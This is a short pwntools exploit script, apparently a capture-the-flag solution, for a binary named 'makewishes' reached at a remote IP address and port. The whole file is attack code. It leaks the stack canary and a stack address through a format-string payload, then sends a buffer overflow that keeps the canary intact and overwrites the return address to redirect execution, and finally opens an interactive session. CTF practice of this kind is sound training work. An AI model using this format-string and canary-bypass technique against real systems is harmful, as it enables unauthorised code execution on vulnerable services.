from pwn import *
# p=process('./makewishes')
p=remote('59.110.164.72',10023)
context.log_level='debug'
# gdb.attach(p,'b *0x00000000000401441')
# gdb.attach(p,'b *0x00000000040139A')
pause()

p.recvuntil(b'Now you can make your first wish\n')
p.sendline(b'1'*16)
p.recvuntil(b'Please give me a number!\n')
p.sendline(b'4')
p.recvuntil(b'Now you can make your second wish!\n')
p.sendline(b'%11$p-%12$p')
p.recvuntil(b'0x')
canary=int(p.recvuntil(b'-',drop=True),16)
print('canary',hex(canary))
stachaddr=int(p.recvuntil(b'\n',drop=True),16)
print('stachaddr',hex(stachaddr))
p.recvuntil(b'Please give me a number!\n')
p.sendline(b'2')
p.recvuntil(b'Now you can make your final wish!\n')
payload=p64(canary)*7+p64(0x0000000004011D6)
p.sendline(payload)
# p.sendline(b'1'*0x30)
p.interactive()